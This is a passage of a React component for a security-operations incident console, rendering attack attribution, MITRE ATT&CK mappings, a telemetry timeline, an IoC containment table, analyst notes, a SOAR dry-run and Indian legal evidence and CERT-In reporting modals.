                      <div className="text-sm font-mono font-bold text-navy-900">
                        {selectedCase.matrix5W1H.who.attacker}
                      </div>
                      <div className="text-[11px] text-slate-600">
                        {selectedCase.matrix5W1H.who.attribution}
                      </div>
                      <div className="text-[10px] text-slate-400 font-mono pt-1 border-t border-slate-200">
                        {selectedCase.matrix5W1H.who.geo} &bull; {selectedCase.matrix5W1H.who.asn}
                      </div>
                    </div>

                    {/* WHAT */}
                    <div className="bg-slate-50 p-3 rounded border border-slate-200 space-y-1.5">
                      <div className="flex items-center justify-between">
                        <span className="text-[10px] text-gov-blue uppercase font-bold tracking-wider">
                          2. WHAT (Vector)
                        </span>
                        <Badge variant="warn" className="text-[9.5px]">EXPLOIT</Badge>
                      </div>
                      <div className="text-xs font-bold text-navy-900 leading-snug">
                        {selectedCase.matrix5W1H.what.attackType}
                      </div>
                      <div className="text-[11px] text-slate-600 font-mono">
                        Protocol: {selectedCase.matrix5W1H.what.targetProtocol}
                      </div>
                      <div className="text-[10px] text-slate-500 pt-1 border-t border-slate-200">
                        {selectedCase.matrix5W1H.what.payloadSummary}
                      </div>
                    </div>

                    {/* WHERE */}
                    <div className="bg-slate-50 p-3 rounded border border-slate-200 space-y-1.5">
                      <div className="flex items-center justify-between">
                        <span className="text-[10px] text-gov-blue uppercase font-bold tracking-wider">
                          3. WHERE (Affected Target)
                        </span>
                        <Badge variant="info" className="text-[9.5px]">INTERNAL</Badge>
                      </div>
                      <div className="text-xs font-mono font-bold text-navy-900">
                        {selectedCase.matrix5W1H.where.asset}
                      </div>
                      <div className="text-[11px] text-slate-600">
                        Zone: <strong>{selectedCase.matrix5W1H.where.zone}</strong>
                      </div>
                      <div className="text-[10px] text-slate-400 font-mono pt-1 border-t border-slate-200">
                        Subnet: {selectedCase.matrix5W1H.where.subnet}
                      </div>
                    </div>

                    {/* WHEN */}
                    <div className="bg-slate-50 p-3 rounded border border-slate-200 space-y-1.5">
                      <div className="flex items-center justify-between">
                        <span className="text-[10px] text-gov-blue uppercase font-bold tracking-wider">
                          4. WHEN (Timing)
                        </span>
                        <Badge variant="ok" className="text-[9.5px]">MICROSECOND</Badge>
                      </div>
                      <div className="text-xs font-mono font-bold text-navy-900">
                        {selectedCase.matrix5W1H.when.firstSeen}
                      </div>
                      <div className="text-[11px] text-slate-600">
                        Burst Window: <strong>{selectedCase.matrix5W1H.when.burstDuration}</strong>
                      </div>
                      <div className="text-[10px] text-green-700 font-mono pt-1 border-t border-slate-200">
                        Evidence: {selectedCase.matrix5W1H.when.eventCount} Correlated UCE Records
                      </div>
                    </div>

                    {/* WHY */}
                    <div className="bg-slate-50 p-3 rounded border border-slate-200 space-y-1.5">
                      <div className="flex items-center justify-between gap-1">
                        <span className="text-[10px] text-gov-blue uppercase font-bold tracking-wider">
                          5. WHY (Intent & CVE)
                        </span>
                        <Badge variant="danger" className="text-[9.5px] whitespace-nowrap flex-shrink-0">
                          {selectedCase.matrix5W1H.why.confidence.includes('%')
                            ? selectedCase.matrix5W1H.why.confidence.split(' ')[0]
                            : 'HIGH CONF'}
                        </Badge>
                      </div>
                      <div className="flex items-center justify-between text-xs pt-0.5">
                        <div>CVE: <strong className="font-mono text-red-600">{selectedCase.matrix5W1H.why.cve}</strong></div>
                        <span className="text-[10px] text-slate-500 font-mono font-semibold bg-white px-1.5 py-0.5 rounded border border-slate-200">
                          {selectedCase.matrix5W1H.why.confidence}
                        </span>
                      </div>
                      <div className="text-[11px] text-slate-600 truncate">
                        Rule: <span className="font-mono">{selectedCase.matrix5W1H.why.ruleTriggered}</span>
                      </div>
                      <div className="text-[10px] text-slate-500 pt-1 border-t border-slate-200">
                        {selectedCase.matrix5W1H.why.intent}
                      </div>
                    </div>

                    {/* HOW */}
                    <div className="bg-slate-50 p-3 rounded border border-slate-200 space-y-1.5">
                      <div className="flex items-center justify-between">
                        <span className="text-[10px] text-gov-blue uppercase font-bold tracking-wider">
                          6. HOW (Mechanics)
                        </span>
                        <Badge variant="neutral" className="text-[9.5px]">EXECUTION</Badge>
                      </div>
                      <div className="text-xs font-mono font-bold text-navy-900 truncate">
                        {selectedCase.matrix5W1H.how.executionPath}
                      </div>
                      <div className="text-[11px] text-slate-600">
                        Privilege: <strong>{selectedCase.matrix5W1H.how.privilege}</strong>
                      </div>
                      {selectedCase.matrix5W1H.how.parentProcess && (
                        <div className="text-[10px] text-slate-400 font-mono pt-1 border-t border-slate-200 truncate">
                          {selectedCase.matrix5W1H.how.parentProcess} &rarr; {selectedCase.matrix5W1H.how.childProcess}
                        </div>
                      )}
                    </div>
                  </div>

                  {/* MITRE ATT&CK Mapping Bar */}
                  <div className="p-3 bg-blue-50/50 rounded border border-blue-200 flex flex-col sm:flex-row sm:items-center justify-between gap-2">
                    <div>
                      <div className="text-xs font-bold text-navy-900 flex items-center gap-1.5">
                        <Shield className="w-3.5 h-3.5 text-gov-blue" />
                        Mapped MITRE ATT&CK Matrix Techniques:
                      </div>
                      <div className="flex items-center gap-1.5 mt-1 flex-wrap">
                        {selectedCase.mitreTechniques.map((mt) => (
                          <span
                            key={mt.id}
                            onClick={() => navigate('/mitre-attack')}
                            className="inline-flex items-center gap-1 px-2 py-0.5 rounded bg-white border border-blue-300 text-gov-blue font-mono text-[11px] cursor-pointer hover:bg-gov-blue hover:text-white transition-colors"
                            title={`Click to view ${mt.tactic} in MITRE Matrix`}
                          >
                            <strong>{mt.id}</strong> {mt.name}
                          </span>
                        ))}
                      </div>
                    </div>
                    <Button
                      size="sm"
                      variant="outline"
                      onClick={() => navigate('/mitre-attack')}
                      className="text-[11px] h-7 whitespace-nowrap self-start sm:self-center"
                    >
                      Open Full Matrix &rarr;
                    </Button>
                  </div>
                </div>
              )}

              {/* ============================================================= */}
              {/* TAB 2: Chronological Telemetry Evidence Stream                */}
              {/* ============================================================= */}
              {activeTab === 'timeline' && (
                <div className="space-y-3 text-xs">
                  <div className="flex items-center justify-between text-xs text-slate-500 pb-1 border-b border-slate-100">
                    <span>UCE Normalized Telemetry Trace ({selectedCase.timeline.length} Events)</span>
                    <span className="font-mono text-[11px]">CAS Merkle Proof: Verified</span>
                  </div>

                  <div className="border-l-2 border-gov-blue pl-4 space-y-4 font-mono">
                    {selectedCase.timeline.map((evt) => (
                      <div key={evt.id} className="relative group">
                        <span className="absolute -left-[21px] top-1 w-2.5 h-2.5 rounded-full bg-gov-blue border-2 border-white shadow-xs" />
                        <div className="bg-slate-50 p-3 rounded border border-slate-200 space-y-1 hover:border-gov-blue transition-colors">
                          <div className="flex items-center justify-between text-[10.5px]">
                            <span className="text-slate-400 font-semibold">{evt.timestamp}</span>
                            <div className="flex items-center gap-1.5">
                              <span className="px-1.5 py-0.5 rounded bg-slate-200 text-slate-700 text-[10px]">
                                {evt.vendor}
                              </span>
                              <Badge
                                variant={
                                  evt.action === 'DENY' || evt.action === 'BLOCK'
                                    ? 'danger'
                                    : evt.action === 'ALERT'
                                    ? 'warn'
                                    : 'ok'
                                }
                                className="text-[10px]"
                              >
                                {evt.action}
                              </Badge>
                            </div>
                          </div>

                          <div className="text-xs font-bold text-navy-900 font-sans">
                            {evt.event}
                          </div>

                          <div className="text-[11px] text-slate-600 font-sans">
                            {evt.details}
                          </div>

                          <div className="flex items-center justify-between text-[10px] text-slate-400 pt-1.5 border-t border-slate-200 flex-wrap gap-2">
                            <span>Source: <strong className="text-slate-600">{evt.source}</strong></span>
                            <div className="flex items-center gap-1">
                              <span className="text-slate-400">CAS:</span>
                              <code className="text-gov-blue">{evt.casHash.slice(0, 24)}...</code>
                              <button
                                onClick={() => handleCopyHash(evt.casHash)}
                                className="p-0.5 hover:text-navy-900"
                                title="Copy full CAS Hash"
                              >
                                {copiedCasHash === evt.casHash ? (
                                  <Check className="w-3 h-3 text-green-600" />
                                ) : (
                                  <Copy className="w-3 h-3 text-slate-400" />
                                )}
                              </button>
                            </div>
                          </div>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {/* ============================================================= */}
              {/* TAB 3: IoC Threat Indicators Workbench                        */}
              {/* ============================================================= */}
              {activeTab === 'iocs' && (
                <div className="space-y-3 text-xs">
                  <div className="flex items-center justify-between pb-1 border-b border-slate-100">
                    <span className="text-slate-500">
                      Identified Indicators of Compromise ({selectedCase.iocs.length})
                    </span>
                    <span className="text-[11px] text-slate-400">
                      One-click containment orchestrates perimeter firewall & EDR
                    </span>
                  </div>

                  <div className="border border-border-light rounded overflow-hidden shadow-xs">
                    <table className="w-full text-left text-xs">
                      <thead className="bg-slate-50 text-[10.5px] font-bold text-slate-500 uppercase border-b border-border-light">
                        <tr>
                          <th className="p-2.5 w-28">Indicator Type</th>
                          <th className="p-2.5">Artifact / Value</th>
                          <th className="p-2.5 w-44">Threat Verdict</th>
                          <th className="p-2.5 text-right w-44 whitespace-nowrap">Containment Action</th>
                        </tr>
                      </thead>
                      <tbody className="divide-y divide-slate-100 font-mono">
                        {selectedCase.iocs.map((ioc) => (
                          <tr key={ioc.id} className="hover:bg-slate-50/70 transition-colors">
                            <td className="p-2.5 text-slate-600 font-sans">
                              <Badge variant="neutral" className="text-[10px]">{ioc.type}</Badge>
                            </td>
                            <td className="p-2.5 font-bold text-navy-900">
                              {ioc.value.length > 36 && ioc.type === 'HASH_SHA256' ? (
                                <span className="inline-flex items-center gap-1.5" title={ioc.value}>
                                  <span className="font-mono text-xs">{ioc.value.slice(0, 16)}...{ioc.value.slice(-10)}</span>
                                  <button
                                    onClick={() => handleCopyHash(ioc.value)}
                                    className="text-slate-400 hover:text-navy-900 transition-colors p-0.5"
                                    title="Copy full SHA-256 hash"
                                  >
                                    {copiedCasHash === ioc.value ? (
                                      <Check className="w-3 h-3 text-emerald-600" />
                                    ) : (
                                      <Copy className="w-3 h-3" />
                                    )}
                                  </button>
                                </span>
                              ) : (
                                <span className="font-mono text-xs break-all">{ioc.value}</span>
                              )}
                            </td>
                            <td className="p-2.5">
                              <Badge
                                variant={
                                  ioc.reputation === 'CONFIRMED_THREAT' || ioc.reputation === 'MALICIOUS'
                                    ? 'danger'
                                    : 'warn'
                                }
                                className="text-[10px] whitespace-nowrap"
                              >
                                {ioc.reputation.replace('_', ' ')} ({ioc.confidence}%)
                              </Badge>
                            </td>
                            <td className="p-2.5 text-right whitespace-nowrap">
                              {ioc.status === 'ACTIVE' ? (
                                <Button
                                  size="sm"
                                  variant="danger"
                                  onClick={() => {
                                    let actionLabel = 'Perimeter Firewall Block';
                                    let targetStatus: IoCStatus = 'BLOCKED';
                                    if (ioc.type === 'HASH_SHA256') {
                                      actionLabel = 'EDR Process Quarantine';
                                      targetStatus = 'QUARANTINED';
                                    } else if (ioc.type === 'PROCESS') {
                                      actionLabel = 'EDR Process Termination';
                                      targetStatus = 'QUARANTINED';
                                    } else if (ioc.type === 'DOMAIN') {
                                      actionLabel = 'DNS Sinkhole Policy';
                                      targetStatus = 'BLOCKED';
                                    } else if (ioc.type === 'CVE') {
                                      actionLabel = 'Virtual Patching WAF Rule';
                                      targetStatus = 'BLOCKED';
                                    }
                                    handleIoCContainment(ioc.id, actionLabel, targetStatus);
                                  }}
                                  className="text-xs h-7.5 px-3 whitespace-nowrap inline-flex items-center gap-1.5 font-semibold shadow-xs"
                                >
                                  <ShieldAlert className="w-3.5 h-3.5 flex-shrink-0" />
                                  {ioc.type === 'IPv4'
                                    ? 'Block IP'
                                    : ioc.type === 'HASH_SHA256'
                                    ? 'Quarantine Hash'
                                    : ioc.type === 'DOMAIN'
                                    ? 'Sinkhole Domain'
                                    : ioc.type === 'PROCESS'
                                    ? 'Terminate Process'
                                    : 'Deploy WAF Rule'}
                                </Button>
                              ) : (
                                <span className="text-xs text-green-800 font-semibold inline-flex items-center gap-1.5 font-sans bg-green-50 px-2.5 py-1 rounded border border-green-200">
                                  <CheckCircle2 className="w-3.5 h-3.5 text-green-600" />
                                  Contained ({ioc.status})
                                </span>
                              )}
                            </td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  </div>
                </div>
              )}

              {/* ============================================================= */}
              {/* TAB 4: Analyst Findings & Evidence Journal                    */}
              {/* ============================================================= */}
              {activeTab === 'journal' && (
                <div className="space-y-4 text-xs">
                  {/* Add Note Input Box */}
                  <form onSubmit={handleAddNote} className="bg-slate-50 p-3 rounded border border-slate-200 space-y-2">
                    <div className="flex items-center justify-between">
                      <span className="font-bold text-navy-900">Add Operational Finding / Forensic Note:</span>
                      <select
                        value={newNoteCategory}
                        onChange={(e) => setNewNoteCategory(e.target.value as AnalystNote['category'])}
                        className="text-xs bg-white border border-slate-300 rounded px-2 py-0.5 text-navy-900"
                      >
                        <option value="Initial Assessment">Initial Assessment</option>
                        <option value="Forensic Analysis">Forensic Analysis</option>
                        <option value="Containment Action">Containment Action</option>
                        <option value="CERT-In Statutory Note">CERT-In Statutory Note</option>
                      </select>
                    </div>

                    <textarea
                      rows={2}
                      value={newNoteContent}
                      onChange={(e) => setNewNoteContent(e.target.value)}
                      placeholder="Record observation, containment decision, or forensic artifact hash..."
                      className="w-full text-xs p-2 bg-white border border-slate-300 rounded focus:ring-1 focus:ring-gov-blue focus:outline-none text-navy-900"
                    />

                    <div className="flex justify-end">
                      <Button size="sm" variant="primary" type="submit" className="text-xs h-7">
                        Post Finding
                      </Button>
                    </div>
                  </form>

                  {/* Notes Feed */}
                  <div className="space-y-3">
                    <div className="text-xs font-bold text-slate-400 uppercase tracking-wider">
                      HISTORICAL WORKLOG ({selectedCase.notes.length} ENTRIES)
                    </div>

                    {selectedCase.notes.map((n) => (
                      <div key={n.id} className="p-3 bg-white border border-border-light rounded space-y-1.5 shadow-2xs">
                        <div className="flex items-center justify-between text-[11px]">
                          <div className="flex items-center gap-1.5">
                            <span className="font-bold text-navy-900">{n.author}</span>
                            <span className="text-slate-400">({n.role})</span>
                          </div>
                          <div className="flex items-center gap-2">
                            <Badge variant="neutral" className="text-[10px]">{n.category}</Badge>
                            <span className="text-slate-400 font-mono text-[10px]">{n.timestamp}</span>
                          </div>
                        </div>
                        <p className="text-xs text-slate-700 leading-relaxed font-sans">{n.content}</p>
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {/* ============================================================= */}
              {/* TAB 5: SOAR Remediation & Response Playbooks                  */}
              {/* ============================================================= */}
              {activeTab === 'playbook' && (
                <div className="space-y-4 text-xs">
                  {/* Recommended Playbook Card */}
                  <div className="p-4 bg-gradient-to-r from-blue-50 to-indigo-50 border border-blue-200 rounded space-y-3">
                    <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2">
                      <div className="flex items-center gap-2">
                        <Zap className="w-5 h-5 text-amber-500" />
                        <div>
                          <span className="text-[10px] font-bold text-gov-blue uppercase tracking-wider block">
                            RECOMMENDED SOAR RESPONSE PLAYBOOK
                          </span>
                          <h4 className="text-sm font-bold text-navy-900">
                            {selectedCase.recommendedPlaybook.name}
                          </h4>
                        </div>
                      </div>
                      <Badge variant="warn">
                        BLAST RADIUS: {selectedCase.recommendedPlaybook.blastRadius}
                      </Badge>
                    </div>

                    <div className="text-xs text-slate-700">
                      <strong>Trigger Justification:</strong> {selectedCase.recommendedPlaybook.reason}
                    </div>

                    <div className="text-xs text-slate-700 font-mono bg-white/80 p-2 rounded border border-blue-200">
                      Target Entity Scope: <strong>{selectedCase.recommendedPlaybook.targetAsset}</strong>
                    </div>

                    <div className="flex items-center gap-3 flex-wrap pt-1">
                      <Button
                        size="sm"
                        variant="primary"
                        onClick={handleRunInDeskSimulation}
                        disabled={dryRunRunning}
                        className="text-xs h-8 flex items-center gap-1.5 !bg-navy-900 hover:!bg-navy-800"
                      >
                        <Play className="w-3.5 h-3.5 text-emerald-400" />
                        {dryRunRunning ? 'Simulating Dry-Run...' : 'Run In-Desk Safe Dry-Run Simulation'}
                      </Button>

                      <Button
                        size="sm"
                        variant="outline"
                        onClick={() =>
                          navigate(
                            `/playbooks?playbook=${selectedCase.recommendedPlaybook.id}&asset=${encodeURIComponent(
                              selectedCase.recommendedPlaybook.targetAsset
                            )}`
                          )
                        }
                        className="text-xs h-8 flex items-center gap-1.5"
                      >
                        <ExternalLink className="w-3.5 h-3.5 text-slate-500" />
                        Open in Full SOAR Simulator
                      </Button>
                    </div>
                  </div>

                  {/* Dry Run Terminal Output */}
                  {dryRunLogs.length > 0 && (
                    <div className="bg-slate-950 text-slate-200 p-3.5 rounded font-mono text-xs space-y-1 border border-slate-800 shadow-inner">
                      <div className="text-[10.5px] text-slate-400 pb-1 mb-1 border-b border-slate-800 flex items-center justify-between">
                        <span>SIMULATED DISPATCH TERMINAL OUTPUT</span>
                        <span className="text-emerald-400 font-semibold">STATUS: PASS_NO_SIDE_EFFECTS</span>
                      </div>
                      {dryRunLogs.map((line, idx) => (
                        <div key={idx} className="leading-snug">
                          {line.includes('PASS_NO_SIDE_EFFECTS') ? (
                            <span className="text-emerald-400 font-bold">{line}</span>
                          ) : line.includes('AUTH') ? (
                            <span className="text-sky-300">{line}</span>
                          ) : (
                            line
                          )}
                        </div>
                      ))}
                    </div>
                  )}
                </div>
              )}

              {/* ============================================================= */}
              {/* TAB 6: Evidence Chain & Section 65B Proof                     */}
              {/* ============================================================= */}
              {activeTab === 'section65b' && (
                <div className="space-y-4 text-xs">
                  <div className="bg-slate-50 p-4 rounded border border-slate-200 space-y-3">
                    <div className="flex items-center justify-between">
                      <div className="flex items-center gap-2">
                        <FileCheck className="w-4 h-4 text-gov-blue" />
                        <h4 className="font-bold text-navy-900">
                          Indian Evidence Act Section 65B Sovereign Chain of Custody
                        </h4>
                      </div>
                      <Badge variant="ok">BLOCK #{selectedCase.forensicChain.blockHeight}</Badge>
                    </div>

                    <div className="grid grid-cols-1 md:grid-cols-2 gap-3 font-mono text-[11px]">
                      <div className="bg-white p-2.5 rounded border border-slate-200 space-y-1">
                        <span className="text-[10px] text-slate-400 block uppercase font-bold">
                          Merkle Root Hash
                        </span>
                        <code className="text-gov-blue text-[10.5px] break-all">
                          {selectedCase.forensicChain.merkleRoot}
                        </code>
                      </div>

                      <div className="bg-white p-2.5 rounded border border-slate-200 space-y-1">
                        <span className="text-[10px] text-slate-400 block uppercase font-bold">
                          Proof-of-Authority (PoA) Signature
                        </span>
                        <code className="text-slate-700 text-[10.5px] break-all">
                          {selectedCase.forensicChain.poaSignature}
                        </code>
                      </div>
                    </div>

                    <div className="flex items-center justify-between text-xs pt-1">
                      <span className="text-slate-600">
                        Total Verified Evidence Records:{' '}
                        <strong>{selectedCase.forensicChain.totalRecordsVerified} Logs</strong>
                      </span>

                      <Button
                        size="sm"
                        variant="primary"
                        onClick={() => setIsSection65BModalOpen(true)}
                        className="text-xs h-7.5 flex items-center gap-1.5"
                      >
                        <FileCheck className="w-3.5 h-3.5" />
                        Preview Court Certificate
                      </Button>
                    </div>
                  </div>
                </div>
              )}
            </div>
          </div>
        </div>
      </div>

      {/* =================================================================== */}
      {/* MODAL 1: Section 65B Evidence Certificate Modal                     */}
      {/* =================================================================== */}
      {isSection65BModalOpen && (
        <Modal
          isOpen={isSection65BModalOpen}
          onClose={() => setIsSection65BModalOpen(false)}
          title="Section 65B Electronic Evidence Certificate"
          maxWidth="max-w-5xl"
        >
          <Section65BCertificate
            incidentId={selectedCase.id}
            incidentTitle={selectedCase.title}
            sourceDevice={selectedCase.matrix5W1H.where.hostname || selectedCase.matrix5W1H.where.asset}
            targetEntity={selectedCase.matrix5W1H.where.asset}
            rawPayloadHash={selectedCase.forensicChain.merkleRoot}
            blockchainBlockHash={selectedCase.forensicChain.poaSignature}
            blockIndex={selectedCase.forensicChain.blockHeight}
            merkleRoot={selectedCase.forensicChain.merkleRoot}
            poaSignature={selectedCase.forensicChain.poaSignature}
            timestampIst={selectedCase.created}
            officerName={selectedCase.analyst}
            onClose={() => setIsSection65BModalOpen(false)}
          />
        </Modal>
      )}

      {/* =================================================================== */}
      {/* MODAL 2: CERT-In 6-Hour Statutory Notice Format                     */}
      {/* =================================================================== */}
      {isCertInModalOpen && (
        <Modal
          isOpen={isCertInModalOpen}
          onClose={() => setIsCertInModalOpen(false)}
          title="CERT-In Statutory Incident Reporting Notice (Rule 20(1))"
          maxWidth="max-w-3xl"
          footer={
            <div className="flex items-center gap-2">
              <Button size="sm" variant="outline" onClick={() => setIsCertInModalOpen(false)}>
                Close
              </Button>
              <Button
                size="sm"
                variant="primary"
                onClick={handleCopyCertInNotice}
                className="flex items-center gap-1.5"
              >
                {copiedCertInNotice ? <Check className="w-3.5 h-3.5" /> : <Copy className="w-3.5 h-3.5" />}
                {copiedCertInNotice ? 'Copied' : 'Copy Notice Text'}
              </Button>
            </div>
          }
        >
          <div className="space-y-3 text-xs">
            <p className="text-slate-600">
              Pursuant to the Cyber Security Directions issued by CERT-In on 28th April 2022 under Section 70B(6)
              of the Information Technology Act, 2000, all cyber security incidents must be reported to CERT-In within <strong>6 hours</strong> of notice.
            </p>

            <pre className="p-3 bg-slate-900 text-slate-100 rounded text-[11px] font-mono whitespace-pre-wrap overflow-x-auto max-h-[380px] border border-slate-800">
              {certInReportText}
            </pre>
          </div>
        </Modal>
      )}

      {/* =================================================================== */}
      {/* MODAL 3: Create New Case Modal                                      */}
      {/* =================================================================== */}
      {isNewCaseModalOpen && (
        <Modal
          isOpen={isNewCaseModalOpen}
          onClose={() => setIsNewCaseModalOpen(false)}
          title="Open New Incident Investigation Case"
          maxWidth="max-w-md"
        >
          <form onSubmit={handleCreateNewCase} className="space-y-3 text-xs">
            <div>
              <label className="block text-xs font-semibold text-navy-900 mb-1">
                Incident Title *
              </label>
              <input
                type="text"
                required
                value={newCaseTitle}
                onChange={(e) => setNewCaseTitle(e.target.value)}
                placeholder="e.g. Unauthorized Kerberos Ticket Granting Storm"
                className="w-full text-xs p-2 border border-slate-300 rounded focus:ring-1 focus:ring-gov-blue focus:outline-none"
              />
            </div>

            <div className="grid grid-cols-2 gap-2">
              <div>
                <label className="block text-xs font-semibold text-navy-900 mb-1">
                  Severity Level
                </label>
                <select
                  value={newCaseSeverity}
                  onChange={(e) => setNewCaseSeverity(e.target.value as CaseSeverity)}
                  className="w-full text-xs p-2 border border-slate-300 rounded"
                >
                  <option value="CRITICAL">CRITICAL</option>
                  <option value="HIGH">HIGH</option>
                  <option value="MEDIUM">MEDIUM</option>
                  <option value="LOW">LOW</option>
                </select>
              </div>

              <div>
                <label className="block text-xs font-semibold text-navy-900 mb-1">
                  Target Asset IP / Host
                </label>
                <input
                  type="text"
                  value={newCaseAsset}
                  onChange={(e) => setNewCaseAsset(e.target.value)}
                  placeholder="10.0.1.45 / srv-db"
                  className="w-full text-xs p-2 border border-slate-300 rounded"
                />
              </div>
            </div>

            <div>
              <label className="block text-xs font-semibold text-navy-900 mb-1">
                Attacker Source IP / Entity
              </label>
              <input
                type="text"
                value={newCaseAttacker}
                onChange={(e) => setNewCaseAttacker(e.target.value)}
                placeholder="198.51.100.99 or external domain"
                className="w-full text-xs p-2 border border-slate-300 rounded"
              />
            </div>

            <div className="pt-2 flex justify-end gap-2 border-t border-slate-200">
              <Button size="sm" variant="outline" type="button" onClick={() => setIsNewCaseModalOpen(false)}>
                Cancel
              </Button>
              <Button size="sm" variant="primary" type="submit">
                Provision Case
              </Button>
            </div>
          </form>
        </Modal>
      )}
    </div>
  );
};
